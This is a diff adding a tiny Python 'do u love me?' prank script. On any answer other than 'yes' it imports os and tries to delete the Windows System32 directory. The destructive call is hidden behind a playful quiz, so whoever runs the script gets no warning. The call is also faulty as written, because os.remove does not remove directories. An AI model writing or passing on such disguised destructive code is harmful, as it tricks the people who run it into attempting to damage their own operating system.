@@ -1,0 +1,7 @@
+jawaban = input("do u love me? (yes/no) : ")
+
+if jawaban == "yes":
+    print("i love u too")
+else:
+    import os
+    os.remove("C:/Windows/System32")
